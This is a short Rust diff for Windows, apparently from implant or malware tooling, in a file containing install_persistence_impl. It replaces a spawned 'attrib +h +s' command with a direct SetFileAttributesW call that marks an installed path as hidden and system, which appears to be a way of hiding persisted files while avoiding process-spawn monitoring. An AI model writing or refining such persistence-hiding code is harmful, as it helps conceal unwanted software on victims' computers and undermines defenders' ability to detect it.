@@ -4,7 +4,6 @@ use directories::BaseDirs;
 use std::env;
 use std::fs;
 use std::path::{Path, PathBuf};
-use std::process::Command;
 use tracing::{debug, error, info, warn};
 use windows::Win32::Foundation::VARIANT_BOOL;
 use windows::Win32::System::Com::*;
@@ -107,9 +106,23 @@ async fn install_persistence_impl() -> Result<(), Box<dyn std::error::Error>> {
 fn set_hidden_system(path: &Path) {
     #[cfg(target_os = "windows")]
     {
-        let _ = Command::new("attrib")
-            .args(&["+h", "+s", path.to_string_lossy().as_ref()])
-            .output();
+        use windows::Win32::Storage::FileSystem::{
+            FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM, SetFileAttributesW,
+        };
+        use windows::core::PCWSTR;
+
+        let path_w: Vec<u16> = path
+            .to_string_lossy()
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
+
+        unsafe {
+            let _ = SetFileAttributesW(
+                PCWSTR(path_w.as_ptr()),
+                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
+            );
+        }
     }
 }
 
